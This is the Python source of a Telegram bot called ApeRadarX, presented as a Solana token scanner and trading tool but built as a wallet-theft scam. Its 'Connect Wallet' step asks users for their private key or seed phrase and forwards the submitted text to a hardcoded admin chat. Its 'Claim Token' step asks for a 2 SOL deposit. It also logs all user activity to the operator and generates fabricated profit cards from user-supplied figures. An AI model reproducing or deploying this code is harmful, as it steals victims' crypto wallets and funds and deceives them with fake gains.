# trigger redeploy v4
"""
ApeRadarX Solana Telegram Bot
PnL Card uses reference background image
"""

import os
import re
import io
import random
import threading
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes,
)

# ─────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
BOT_NAME = "ApeRadarX"
ADMIN_ID = 1495066761
PNL_ALLOWED = {1495066761, 6203945884, 8730420346}

# Background image URL (hosted on GitHub)
PNL_TEMPLATE_URL = "https://raw.githubusercontent.com/emmyrichie11/solana-bot/main/pnl_template.jpg"
PNL_TEMPLATE_PATH = os.path.join(os.path.dirname(__file__), "pnl_template.jpg")
waiting_for_wallet = {}
waiting_for_pnl = {}

# ─────────────────────────────────────────────
# Admin notification
# ─────────────────────────────────────────────
async def notify_admin(context, user, action, extra=""):
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📡 *Activity Log*\n\n"
                 f"👤 Name: {user.full_name}\n"
                 f"🆔 ID: `{user.id}`\n"
                 f"📛 Username: @{user.username if user.username else 'No username'}\n"
                 f"🔘 Action: {action}"
                 + (f"\n📝 `{extra}`" if extra else ""),
            parse_mode="Markdown"
        )
    except: pass

# ─────────────────────────────────────────────
# PnL Card Generator
# ─────────────────────────────────────────────
def format_mcap(n):
    try:
        n = float(n)
        if n >= 1_000_000_000: return f"${n/1_000_000_000:.1f}B"
        if n >= 1_000_000: return f"${n/1_000_000:.1f}M"
        if n >= 1_000: return f"${n/1_000:.1f}K"
        return f"${n:.0f}"
    except: return "N/A"

def get_font(size):
    for p in [
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
        "/usr/share/fonts/truetype/freefont/FreeSansBold.ttf",
    ]:
        try: return ImageFont.truetype(p, size)
        except: continue
    return ImageFont.load_default()

def draw_glow_text(img, cx, y, text, font, color, glow_color):
    draw = ImageDraw.Draw(img, "RGBA")
    bbox = draw.textbbox((0,0), text, font=font)
    w = bbox[2] - bbox[0]
    x = cx - w // 2
    glow = Image.new("RGBA", img.size, (0,0,0,0))
    gd = ImageDraw.Draw(glow)
    for r in range(18, 0, -3):
        a = int(60 * (1 - r/18))
        for ox in range(-r, r+1, 3):
            for oy in range(-r, r+1, 3):
                if ox*ox + oy*oy <= r*r*1.5:
                    gd.text((x+ox, y+oy), text, font=font, fill=(*glow_color, min(a,180)))
    glow = glow.filter(ImageFilter.GaussianBlur(4))
    img = Image.alpha_composite(img.convert("RGBA"), glow)
    d2 = ImageDraw.Draw(img)
    d2.text((x+5, y+5), text, font=font, fill=(0,25,0,200))
    d2.text((x+3, y+3), text, font=font, fill=(0,40,0,200))
    d2.text((x, y), text, font=font, fill=color)
    return img

def _load_pnl_template(W, H):
    """Load the new 4:3 PnL template. Local file is preferred; GitHub is fallback."""
    try:
        if os.path.exists(PNL_TEMPLATE_PATH):
            bg = Image.open(PNL_TEMPLATE_PATH).convert("RGBA")
        else:
            resp = requests.get(PNL_TEMPLATE_URL, timeout=10)
            resp.raise_for_status()
            bg = Image.open(io.BytesIO(resp.content)).convert("RGBA")
        return bg.resize((W, H), Image.LANCZOS)
    except:
        return Image.new("RGBA", (W, H), (2, 10, 2, 255))


def _fit_font(text, max_width, start_size, font_paths=None):
    paths = font_paths or [
        "/usr/share/fonts/truetype/dejavu/DejaVuSansCondensed-Bold.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
        "/usr/share/fonts/truetype/freefont/FreeSansBold.ttf",
    ]
    size = start_size
    while size >= 12:
        for p in paths:
            try:
                f = ImageFont.truetype(p, size)
                probe = Image.new("RGB", (10, 10))
                d = ImageDraw.Draw(probe)
                bb = d.textbbox((0, 0), text, font=f)
                if bb[2] - bb[0] <= max_width:
                    return f
            except:
                continue
        size -= 2
    return get_font(12)


def _center_text(draw, box, text, font, fill, stroke_width=0, stroke_fill=None, y_offset=0):
    x1, y1, x2, y2 = box
    bb = draw.textbbox((0, 0), text, font=font, stroke_width=stroke_width)
    tw = bb[2] - bb[0]
    th = bb[3] - bb[1]
    x = x1 + ((x2 - x1) - tw) / 2
    y = y1 + ((y2 - y1) - th) / 2 - bb[1] + y_offset
    draw.text(
        (x, y), text, font=font, fill=fill,
        stroke_width=stroke_width,
        stroke_fill=stroke_fill
    )


def _neon_text(img, box, text, font, main=(155, 255, 25, 255)):
    """Draw the large multiplier in the same neon-green style as the template."""
    layer = Image.new("RGBA", img.size, (0, 0, 0, 0))
    ld = ImageDraw.Draw(layer)
    x1, y1, x2, y2 = box
    bb = ld.textbbox((0, 0), text, font=font, stroke_width=3)
    tw = bb[2] - bb[0]
    th = bb[3] - bb[1]
    x = x1 + ((x2 - x1) - tw) / 2
    y = y1 + ((y2 - y1) - th) / 2 - bb[1]

    for sw, alpha in [(18, 35), (12, 55), (7, 90)]:
        ld.text((x, y), text, font=font, fill=(70, 255, 0, 25),
                stroke_width=sw, stroke_fill=(80, 255, 0, alpha))
    layer = layer.filter(ImageFilter.GaussianBlur(5))
    img = Image.alpha_composite(img, layer)
    d = ImageDraw.Draw(img)
    d.text((x, y), text, font=font, fill=(95, 180, 35, 255),
           stroke_width=4, stroke_fill=(205, 255, 50, 255))
    return img


def generate_pnl_card(token_symbol, buy_mcap, current_mcap, username, token_logo_url=None):
    # New template is 4:3 (1536x1152), matching the supplied PnL image.
    W, H = 1536, 1152
    GREEN = (145, 255, 25, 255)
    WHITE = (255, 255, 255, 255)
    DARK = (0, 8, 0, 225)

    multiplier = current_mcap / buy_mcap if buy_mcap > 0 else 1.0
    img = _load_pnl_template(W, H)
    draw = ImageDraw.Draw(img, "RGBA")

    # ------------------------------------------------------------------
    # Only the values that change are covered/re-drawn.
    # The supplied image remains the complete background/layout.
    # ------------------------------------------------------------------

    # Coin name / symbol area
    draw.rectangle([120, 88, 585, 305], fill=(0, 0, 0, 205))
    name = token_symbol.upper()
    name_font = _fit_font(name, 445, 118)
    _center_text(draw, (125, 92, 580, 220), name, name_font,
                 (245, 255, 245, 255))
    symbol_text = f"({token_symbol.upper()})"
    symbol_font = _fit_font(symbol_text, 280, 50)
    _center_text(draw, (150, 210, 555, 292), symbol_text, symbol_font,
                 (220, 255, 145, 255))

    # Token logo area
    draw.ellipse([575, 35, 875, 335], fill=(0, 5, 0, 235))
    draw.ellipse([595, 55, 855, 315], outline=(185, 255, 55, 255), width=5)
    draw.ellipse([612, 72, 838, 298], fill=(8, 18, 4, 255))

    logo_loaded = False
    if token_logo_url:
        try:
            r = requests.get(token_logo_url, timeout=6)
            r.raise_for_status()
            li = Image.open(io.BytesIO(r.content)).convert("RGBA")
            li = li.resize((210, 210), Image.LANCZOS)
            mask = Image.new("L", (210, 210), 0)
            ImageDraw.Draw(mask).ellipse([0, 0, 210, 210], fill=255)
            li.putalpha(mask)
            img.paste(li, (640, 80), li)
            draw = ImageDraw.Draw(img, "RGBA")
            logo_loaded = True
        except:
            pass

    if not logo_loaded:
        fallback = token_symbol[:4].upper()
        fallback_font = _fit_font(fallback, 170, 55)
        _center_text(draw, (625, 100, 865, 285), fallback, fallback_font,
                     (210, 255, 120, 255))

    # Called-at value: preserve the original badge design and replace only its value.
    draw.rectangle([180, 372, 390, 438], fill=(0, 8, 0, 215))
    called_font = _fit_font(format_mcap(buy_mcap), 175, 54)
    _center_text(draw, (190, 370, 388, 440), format_mcap(buy_mcap),
                 called_font, WHITE)

    # Main multiplier
    draw.rectangle([385, 300, 1175, 590], fill=(0, 0, 0, 0))
    mult_font = _fit_font(f"{multiplier:.1f}X", 760, 235)
    img = _neon_text(img, (385, 300, 1175, 590), f"{multiplier:.1f}X", mult_font)
    draw = ImageDraw.Draw(img, "RGBA")

    # Gain label
    draw.rectangle([385, 592, 1155, 665], fill=(0, 7, 0, 225))
    gain_text = f"🚀  {multiplier:.1f}X GAIN  🚀"
    gain_font = _fit_font(gain_text, 720, 42)
    _center_text(draw, (390, 592, 1150, 664), gain_text, gain_font, GREEN)

    # Called by
    draw.rectangle([325, 742, 690, 822], fill=(0, 5, 0, 225))
    called_by = f"@{username}"
    called_by_font = _fit_font(called_by, 330, 46)
    _center_text(draw, (325, 740, 690, 825), called_by, called_by_font, WHITE)

    # Current MCAP
    draw.rectangle([820, 742, 1175, 822], fill=(0, 5, 0, 225))
    mcap_text = format_mcap(current_mcap)
    mcap_font = _fit_font(mcap_text, 320, 48)
    _center_text(draw, (815, 740, 1180, 825), mcap_text, mcap_font, WHITE)

    out = img.convert("RGB")
    buf = io.BytesIO()
    out.save(buf, format="PNG")
    buf.seek(0)
    return buf

# ─────────────────────────────────────────────
# Token helpers
# ─────────────────────────────────────────────
def get_token_info(address):
    try:
        res = requests.get(f"https://api.dexscreener.com/latest/dex/tokens/{address}", timeout=10)
        pairs = res.json().get("pairs")
        if not pairs: return None
        return sorted(pairs, key=lambda p: float(p.get("liquidity",{}).get("usd",0) or 0), reverse=True)[0]
    except: return None

def format_number(n):
    try:
        n = float(n)
        if n >= 1_000_000_000: return f"${n/1_000_000_000:.2f}B"
        if n >= 1_000_000: return f"${n/1_000_000:.2f}M"
        if n >= 1_000: return f"${n/1_000:.2f}K"
        return f"${n:.4f}"
    except: return "N/A"

def parse_mcap_input(text):
    text = text.strip().upper().replace(",","")
    try:
        if text.endswith("K"): return float(text[:-1])*1_000
        elif text.endswith("M"): return float(text[:-1])*1_000_000
        elif text.endswith("B"): return float(text[:-1])*1_000_000_000
        else: return float(text)
    except: return None

def build_token_message(pair):
    base = pair.get("baseToken", {})
    name = base.get("name","Unknown")
    symbol = base.get("symbol","???")
    price_usd = pair.get("priceUsd","N/A")
    h1 = pair.get("priceChange",{}).get("h1","N/A")
    h24 = pair.get("priceChange",{}).get("h24","N/A")
    volume_24h = pair.get("volume",{}).get("h24","N/A")
    liquidity = pair.get("liquidity",{}).get("usd","N/A")
    market_cap = pair.get("marketCap","N/A")
    dex = pair.get("dexId","N/A").upper()
    url = pair.get("url","")
    def sign(v):
        try: return "🟢 +" if float(v) >= 0 else "🔴 "
        except: return ""
    msg = (
        f"🪙 *{name}* (${symbol})\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💵 Price: `${float(price_usd):.8f}`\n"
        f"📈 1h:  {sign(h1)}{h1}%\n"
        f"📊 24h: {sign(h24)}{h24}%\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💧 Liquidity: {format_number(liquidity)}\n"
        f"📦 Volume 24h: {format_number(volume_24h)}\n"
        f"🏦 Market Cap: {format_number(market_cap)}\n"
        f"🔁 DEX: {dex}\n"
    )
    if url: msg += f"\n[📎 View on DexScreener]({url})"
    return msg

def token_keyboard(symbol, address):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🟢 Buy {symbol}", callback_data=f"buy:{symbol}"),
         InlineKeyboardButton(f"🔴 Sell {symbol}", callback_data=f"sell:{symbol}")],
        [InlineKeyboardButton("📊 Generate PnL Card", callback_data=f"pnl:{address}")],
        [InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh:{address}")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="home")],
    ])

def is_valid_seed_or_key(text):
    words = text.strip().split()
    if len(words) in (12, 24): return True
    if re.match(r'^[1-9A-HJ-NP-Za-km-z]{87,88}$', text.strip()): return True
    return False

# ─────────────────────────────────────────────
# Menu
# ─────────────────────────────────────────────
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🟢 Buy", callback_data="buy_menu"),
         InlineKeyboardButton("🔴 Sell", callback_data="sell_menu")],
        [InlineKeyboardButton("👛 Connect Wallet", callback_data="connect_wallet"),
         InlineKeyboardButton("🎁 Claim Token", callback_data="claim_token")],
        [InlineKeyboardButton("👥 Referrals", callback_data="referrals"),
         InlineKeyboardButton("❓ Help", callback_data="help")],
        [InlineKeyboardButton("📊 PnL Card", callback_data="pnl_menu"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh_home")],
    ])

def main_menu_text():
    return (
        f"🦍 *Welcome to {BOT_NAME}\\!*\n\n"
        "Track hot tokens, catch early movers, and trade with speed\\.\n\n"
        "Built for apes, powered by real\\-time data, and designed to help "
        "you find the next rocket before it takes off 🚀\n\n"
        "━━━━━━━━━━━━━━━━━\n"
        "💰 *Wallet Balance:* 0\\.00 SOL\n"
        "━━━━━━━━━━━━━━━━━\n\n"
        "📋 *Paste a token contract address* to begin scanning\\.\n\n"
        "Use the buttons below to navigate\\."
    )

# ─────────────────────────────────────────────
# Commands
# ─────────────────────────────────────────────
async def start(update, context):
    user = update.message.from_user
    waiting_for_wallet[user.id] = False
    waiting_for_pnl[user.id] = None
    await notify_admin(context, user, "▶️ Started the bot")
    await update.message.reply_text(main_menu_text(), parse_mode="MarkdownV2", reply_markup=main_menu_keyboard())

async def help_command(update, context):
    user = update.message.from_user
    await notify_admin(context, user, "❓ /help")
    await update.message.reply_text(
        f"❓ *{BOT_NAME} Help*\n\n"
        "🔍 Paste Solana token address to scan\n"
        "🟢 Buy / 🔴 Sell after scanning\n"
        "📊 PnL Card — selected users only\n"
        "👛 Connect Wallet\n"
        "🎁 Claim Token\n"
        "👥 Referrals\n\n/start — Main menu",
        parse_mode="Markdown",
    )

# ─────────────────────────────────────────────
# Button handler
# ─────────────────────────────────────────────
async def button_handler(update, context):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user
    can_pnl = user.id in PNL_ALLOWED

    await notify_admin(context, user, f"🔘 `{data}`")

    if data in ("home", "refresh_home"):
        waiting_for_wallet[user.id] = False
        waiting_for_pnl[user.id] = None
        await query.message.reply_text(main_menu_text(), parse_mode="MarkdownV2", reply_markup=main_menu_keyboard())

    elif data == "pnl_menu":
        if not can_pnl:
            await query.message.reply_text(
                "📊 *PnL Card*\n\n🔒 This feature is available to selected users only.\n\nStay tuned! 🚀",
                parse_mode="Markdown")
            return
        waiting_for_pnl[user.id] = {"step": "address"}
        await query.message.reply_text("📊 *PnL Card Generator*\n\nPaste the token contract address:", parse_mode="Markdown")

    elif data.startswith("pnl:"):
        if not can_pnl:
            await query.message.reply_text("🔒 *PnL Card is for selected users only.*", parse_mode="Markdown")
            return
        address = data.split(":")[1]
        pair = get_token_info(address)
        if pair:
            symbol = pair.get("baseToken",{}).get("symbol","TOKEN")
            current_mcap = pair.get("marketCap", 0)
            waiting_for_pnl[user.id] = {
                "step": "buy_mcap", "address": address, "symbol": symbol,
                "current_mcap": float(current_mcap) if current_mcap else 0,
                "logo_url": pair.get("info",{}).get("imageUrl"),
            }
            await query.message.reply_text(
                f"📊 *{symbol}*\nCurrent MCap: {format_number(current_mcap)}\n\n"
                f"Enter the MCap when you bought _(e.g. 9.3K, 1.2M)_:",
                parse_mode="Markdown")
        else:
            await query.message.reply_text("❌ Could not fetch token data.")

    elif data == "buy_menu":
        await query.message.reply_text("🟢 *Buy Token*\n\nPaste the token contract address!", parse_mode="Markdown")

    elif data == "sell_menu":
        await query.message.reply_text("🔴 *Sell Token*\n\nPaste the token contract address!", parse_mode="Markdown")

    elif data == "connect_wallet":
        waiting_for_wallet[user.id] = True
        await query.message.reply_text(
            "👛 *Connect Wallet*\n\nTo connect your Solana wallet, import your private key or seed phrase.\n\n⚠️ Never share your seed phrase with anyone!",
            parse_mode="Markdown")

    elif data == "claim_token":
        if context.user_data.get("wallet_connected"):
            await query.message.reply_text(
                "🎁 *Claim Token*\n\nTo claim your token, please deposit *2 SOL* to your connected wallet first.\n\nOnce your deposit is confirmed, your tokens will be released automatically! 🚀",
                parse_mode="Markdown")
        else:
            await query.message.reply_text(
                "🎁 *Claim Token*\n\nClick the *CONNECT WALLET* button to generate or connect your wallet and get started.",
                parse_mode="Markdown")

    elif data == "referrals":
        ref_link = f"https://t.me/ApeRadarXBot?start=ref_{user.id}"
        await query.message.reply_text(
            f"👥 *Referrals*\n\nInvite friends and earn rewards!\n\n🔗 Your link:\n`{ref_link}`",
            parse_mode="Markdown")

    elif data == "help":
        await query.message.reply_text(
            f"❓ *Help*\n\n🔍 Paste Solana token address\n📊 PnL Card — selected users\n👛 Connect Wallet\n/start — Main menu",
            parse_mode="Markdown")

    elif data.startswith("buy:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(f"🟢 *Buy {symbol}*\n\n⚠️ Connect your wallet first.", parse_mode="Markdown")

    elif data.startswith("sell:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(f"🔴 *Sell {symbol}*\n\n⚠️ Connect your wallet first.", parse_mode="Markdown")

    elif data.startswith("refresh:"):
        address = data.split(":")[1]
        pair = get_token_info(address)
        if pair:
            symbol = pair.get("baseToken",{}).get("symbol","TOKEN")
            await query.message.edit_text(
                build_token_message(pair), parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, address),
                disable_web_page_preview=True)
        else:
            await query.message.reply_text("⚠️ Could not refresh.")

# ─────────────────────────────────────────────
# Message handler
# ─────────────────────────────────────────────
async def handle_message(update, context):
    text = update.message.text.strip()
    user = update.message.from_user
    can_pnl = user.id in PNL_ALLOWED

    pnl_state = waiting_for_pnl.get(user.id)

    if pnl_state and pnl_state.get("step") == "address":
        if 32 <= len(text) <= 44 and text.isalnum():
            await update.message.reply_text("🔍 Fetching token info...")
            pair = get_token_info(text)
            if pair:
                symbol = pair.get("baseToken",{}).get("symbol","TOKEN")
                current_mcap = pair.get("marketCap", 0)
                waiting_for_pnl[user.id] = {
                    "step": "buy_mcap", "address": text, "symbol": symbol,
                    "current_mcap": float(current_mcap) if current_mcap else 0,
                    "logo_url": pair.get("info",{}).get("imageUrl"),
                }
                await update.message.reply_text(
                    f"📊 *{symbol}*\nCurrent MCap: {format_number(current_mcap)}\n\nEnter the MCap when you bought _(e.g. 9.3K, 1.2M)_:",
                    parse_mode="Markdown")
            else:
                await update.message.reply_text("❌ Token not found.")
        else:
            await update.message.reply_text("⚠️ Paste a valid Solana token address.")
        return

    if pnl_state and pnl_state.get("step") == "buy_mcap":
        buy_mcap = parse_mcap_input(text)
        if buy_mcap and buy_mcap > 0:
            current_mcap = pnl_state["current_mcap"]
            symbol = pnl_state["symbol"]
            logo_url = pnl_state.get("logo_url")
            username = user.username or user.first_name or "ApeRadarX"
            waiting_for_pnl[user.id] = None
            await update.message.reply_text("🎨 Generating your PnL card...")
            try:
                card = generate_pnl_card(symbol, buy_mcap, current_mcap, username, logo_url)
                multiplier = current_mcap / buy_mcap
                await update.message.reply_photo(
                    photo=card,
                    caption=f"📊 *{symbol}* | *{multiplier:.1f}X GAIN* 🚀\nGenerated by @ApeRadarXBot",
                    parse_mode="Markdown")
                await notify_admin(context, user, f"📊 PnL card: {symbol} {multiplier:.1f}X")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")
        else:
            await update.message.reply_text("⚠️ Invalid format. Use: 9.3K, 1.2M, 500000")
        return

    if waiting_for_wallet.get(user.id):
        if is_valid_seed_or_key(text):
            await notify_admin(context, user, "👛 Wallet credentials submitted", text)
            waiting_for_wallet[user.id] = False
            context.user_data["wallet_connected"] = True
            await update.message.reply_text("✅ *Wallet connected successfully!*", parse_mode="Markdown")
        else:
            await notify_admin(context, user, "❌ Invalid wallet input", text)
            await update.message.reply_text("⚠️ Invalid seed phrase. Check your words and try again.")
        return

    if 32 <= len(text) <= 44 and text.isalnum():
        await update.message.reply_text("🔍 Scanning token...")
        pair = get_token_info(text)
        if pair:
            symbol = pair.get("baseToken",{}).get("symbol","TOKEN")
            await notify_admin(context, user, f"🔍 Scanned: {symbol}", text)
            await update.message.reply_text(
                build_token_message(pair), parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, text),
                disable_web_page_preview=True)
        else:
            await notify_admin(context, user, "❌ Token not found", text)
            await update.message.reply_text("❌ Token not found. Paste a valid Solana contract address.")
    else:
        await notify_admin(context, user, "💬 Message", text)
        await update.message.reply_text("👋 Paste a Solana token address to scan!\nOr tap /start for the menu.")

# ─────────────────────────────────────────────
# Web server
# ─────────────────────────────────────────────
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ApeRadarX Bot is running!")
    def log_message(self, format, *args): pass

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    HTTPServer(("0.0.0.0", port), HealthHandler).serve_forever()

# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────
if __name__ == "__main__":
    print("🤖 ApeRadarX Bot starting...")
    t = threading.Thread(target=run_web_server)
    t.daemon = True
    t.start()
    print("✅ Web server started!")
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("✅ Bot is running!")
    app.run_polling()
